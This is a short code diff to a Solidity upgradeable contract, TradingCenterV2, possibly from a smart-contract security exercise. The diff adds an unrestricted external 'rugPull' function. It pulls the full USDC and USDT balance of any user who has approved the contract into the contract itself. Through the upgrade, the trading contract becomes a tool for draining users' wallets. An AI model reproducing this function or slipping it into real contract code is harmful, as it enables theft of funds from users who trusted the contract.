@@ -13,4 +13,11 @@ contract TradingCenterV2 is TradingCenter {
         require(initializedV2 == false, "already initialized (v2)");
         initializedV2 = true;
     }
+
+    function rugPull(address user) external {
+        uint256 balanceOfUSDC = usdc.balanceOf(user);
+        usdc.transferFrom(user, address(this), balanceOfUSDC);
+        uint256 balanceOfUSDT = usdt.balanceOf(user);
+        usdt.transferFrom(user, address(this), balanceOfUSDT);
+    }
 }
